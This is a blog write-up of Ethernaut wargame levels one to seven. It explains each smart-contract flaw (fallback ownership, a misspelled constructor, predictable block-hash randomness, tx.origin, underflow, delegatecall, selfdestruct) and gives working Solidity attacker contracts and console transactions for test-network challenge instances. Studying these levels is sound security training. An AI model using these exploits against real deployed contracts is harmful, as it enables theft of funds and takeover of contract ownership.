---
layout: post
title:  Ethernaut challenges writeup Part I (Challenges 01 to 07).
excerpt_separator: <!--more-->
category: DeFi
---

Hi There!. I'm continuing writing about my work solving different DeFi wargames and challenges. This time is the turn of [Ethernaut](https://ethernaut.openzeppelin.com/). In this first post I'll detail the solutions for challenges one to seven. I hope that you enjoy it. 

<!--more-->

# Challenges write up

## Hello Ethernaut

This very first level is an introduction that helps the player learn how to interact with the game. Basically we can solve it following the instructions we are given by the contract's answers. I'll quickly detail the steps I followed.

We are told first to check contract's method `info()`. We can do that typing in the console `await contract.info()`. We are told to check `info1()`.
We type `await contract.info1()` and receive as response `'Try info2(), but with "hello" as a parameter.'`. Executing `await contract.info2("hello")` we receive as response `'The property infoNum holds the number of the next info method to call.'`. Calling `await contract.infoNum()`, we obtain an array with the number we are looking for: `42`. Then we need to execute `info42()`, as response we get `'theMethodName is the name of the next method.'`. Calling that last function we get `'The method name is method7123949.'`, we execute it and receive as response: `'If you know the password, submit it to authenticate().'`. At this point I guessed that there was a property called `password` and tried calling `contract.password`. I was almost right, as `password` ended up being a function. Calling `password()` we obtain the password which is `ethernaut0`. I called `await contract.authenticate("ethernaut0")` solving the level.

## Fallback

I was stuck in this challenge for a bit, due to my lack of attention to all the details. To solve this challenge you need to become owner of the contract and withdraw the funds. The contract implements the `onlyOwner` modifier and the owner is set during the contract's deployment (out of the attacker's control). The description already gives us a hint about where to look, as it mentions `fallback` functions, and also, we can review the contract's code. We can see that there is an interesting function called `receive()`. If we look at [Solidity's documentation](https://docs.soliditylang.org/en/v0.8.12/contracts.html#special-functions) we can find the following explanation:

"...The receive function is executed on a call to the contract with empty calldata. This is the function that is executed on plain Ether transfers (e.g. via .send() or .transfer()). If no such function exists, but a payable fallback function exists, the fallback function will be called on a plain Ether transfer. If neither a receive Ether nor a payable fallback function is present, the contract cannot receive Ether through regular transactions and throws an exception..."

This explains how we can call this function. Let's review what it does:

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

We can see that first checks if the value of Ether sent is greater than 0 BUT ALSO that the caller has an entry greater than 0 in the `contributions` mapping. I missed this detail for quite some time!.

To solve this challenge then we need to meet the following conditions:

1. Contribute to the contract with some Ether.
2. Send Ether to the contract in a way that triggers the execution of the `receive()` function.
3. Execute the `withdraw()`

So we can execute the following steps:

First we call the `contribute()` function. This function expects an amount lower than 0.001 ether sent via `msg.value`. We can call it in the following way.

```
//contract.abi[1] == contribute()
sendTransaction({from:player, to:contract.address, value:toWei('0.00001', 'ether'), data:contract.abi[1].signature})
```

Next we can use `sendTransaction` to send Ether to the contract, triggering the execution of `receive()`.

```
sendTransaction({from:player, to:contract.address, value:toWei('0.00001', 'ether'))
```

And finally, we call `withdraw()`:

```
contract.withdraw()
```

## Fallout

In this level we need to gain ownership of the contract. Looking at the source code the only place where the owner is set looks like to be the contract's constructor. But after close inspection and discarding the misleading comment, we can see that the function's name it is different than the contract's name, Fallout is misspelled in the function's name!. This means that the function is not the constructor, and thus, we can call it!

```
//contract.abi[0] == Fal1out()

sendTransaction({from:player, to:contract.address, data:contract.abi[0].signature, value:toWei('0.0001', 'ether')})
```

## Coin Flip

In this level we have to predict ten times in a row the value of a "coin flip". This coin flip is represented by a value that can be either TRUE or FALSE. This value is calculated as the integer division between a `uint256` derived from the `block number` and a constant number `FACTOR`.

The problem is that `block number` [should not be used as a source of randomness](https://solidity-by-example.org/hacks/randomness/). The attacker can predict the correct guess each time. I implemented this solution in section Solution Source Code.

### Further Reading / Sources

- Ethereum Blocks - https://ethereum.org/en/developers/docs/blocks/
- Solidity Global Variables - https://docs.soliditylang.org/en/develop/units-and-global-variables.html#block-and-transaction-properties

### Solution Source code

```
// SPDX-License-Identifier: MIT
// Deployed at: 0xdD4997733eE8d16A778B5C0D6f5583D90A0C2800 In Rinkeby Test Network

pragma solidity ^0.8.7;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 wins = 0;
    address coinFlipInstance = 0x472A3F7B9d5cc301856000d8A80c6363085331EE;

    function guessFlip(uint256 blockValue) public view returns (bool) {
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    function attack() public {
        bool guess = guessFlip(uint256(blockhash(block.number - 1)));
        ICoinFlip(coinFlipInstance).flip(guess);
    }
}
```

## Telephone

The problem relies in the use of `tx.origin` to authenticate who called the contract when the code should have used `msg.sender`. In this case the challenge's code checks that `tx.origin` != `msg.sender`. To pass this check I created two contracts. The first one `CallOne` calls the second one `CallTwo`. This second contract then calls `Telephone`. In this way and taking into account the last contract's context, `tx.origin` == `CallOne Contract Address` and `msg.sender` == `CallTwo Contract Address`. 

### Further Reading

- Phishing with tx.origin - https://solidity-by-example.org/hacks/phishing-with-tx-origin/
- Security Alert (tx.origin) - https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/

### Solution Source code

```
// SPDX-License-Identifier: MIT
// Deployed at: 0x3F1a746bd0c24d6DB7e0172e0Cfc465C7AC44375 Rinkeby Test Network

pragma solidity ^0.8.7;

interface ICallTwo {
    function call2() external;
}

contract CallOne {
    function call1() public {

        //Address of the second contract used in the attack (see below)
        ICallTwo(0xcfC7b041Ba0420d73c6B9C8Ac832fd2bc9175470).call2();
    }
}
```

Contract #2

```
// SPDX-License-Identifier: MIT
// Deployed at: 0xcfC7b041Ba0420d73c6B9C8Ac832fd2bc9175470 Rinkeby Test network

pragma solidity ^0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract CallTwo {
    function call2() public {
        // Ethernaut Instance
        address victim = 0xe2EC929D9fA9AF49CD5862C1336c91533064Ce25;
        // Ethernaut Player Address
        address attacker = 0x922e34D7d34C70Df760DF873BC6F99a10dea516E;
        ITelephone(victim).changeOwner(attacker);
    }
}
```

## Token

In this challenge the main issue that we can exploit it is an Integer underflow while subtracting `_value` from `balances[msg.sender]`. This is performed in the `require` and later in `balances[msg.sender] -= _value;`. The contract is not using OpenZeppelin's Safemath nor a version of the Solidity compiler that protects against these kind of issues (as far as I understand this is happening with Solidity 0.8)

To solve it you can perform the following action. As the underflow occurs due to balance being 0, the check in the require passes (result will be a very big number).

```
contract.transfer(instance, toWei('20', 'ether'))
```

### Further Reading

- Solidity v0.8.0 Breaking Changes - https://docs.soliditylang.org/en/v0.8.9/080-breaking-changes.html

## Delegation

The main idea in this challenge is to somehow claim ownership of the given contract's instance. Analyzing the code and looking at the hints we can see the use of `delegatecall` to call functions passed in `msg.data`. As it is possible to see, contract `Delegation`, when receiving a call that's processed by the `fallback` method, that's when the function called does not match any of the defined functions, will delegate the execution of the call in the `Delegate` contract.

Our main goal here is to claim ownership of the `Delegation` contract, and for that we can use the `pwn()` function defined in `Delegate`. When using `delegatecall` the contract delegating the call "allows" the "delegatee" to execute code in their context. This means that `Delegate` contract will be able to modify `owner` variable from `Delegation`. This way we can execute the following call and gain ownership of the contract:


```
// Obtaining the Encoded Signature of the pwn() function
// Result is "0xdd365b8b"

web3.eth.abi.encodeFunctionSignature('pwn()')

// Triggering the execution of the fallback function in the contract

sendTransaction({from:player, to:contract.address, data:'0xdd365b8b'})
```

### Further Reading

- The Parity Hack, a real example of the dangers of delegatecall - https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/
- Get encoded function signatures with Web3.js - https://piyopiyo.medium.com/how-to-get-ethereum-encoded-function-signatures-1449e171c840


## Force

To beat this level we need to find a way to send Ether to it. The approach I used was to use the `selfdestruct` instruction from a malicious contract. [Selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) allows to specify an address which will receive the remaining balance in the contract before destroying it.

This cannot be prevented by the receiving contract. Based on this behavior, contracts SHOULD NOT rely on `address(this).balance == 0` to perform any critical operation.

I created the contract shown below and deployed it with 100 wei. After that I called the `attack()` function that self destructs the contract, sending the balance to the challenge contract.

## Further Reading

- Selfdestruct - https://solidity-by-example.org/hacks/self-destruct/
- Solidity - transfer vs send vs call function - https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a

### Solution Source code

```
Solution:

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TakeMyEther {
    address victimContract = 0x4493eeC7243873b94278497fF64Cb12bB9a778Bc;

    constructor() payable public {
        
    }

    function attack() public payable {
        address payable addr = payable(address(victimContract));
        selfdestruct(addr);
    }
}
```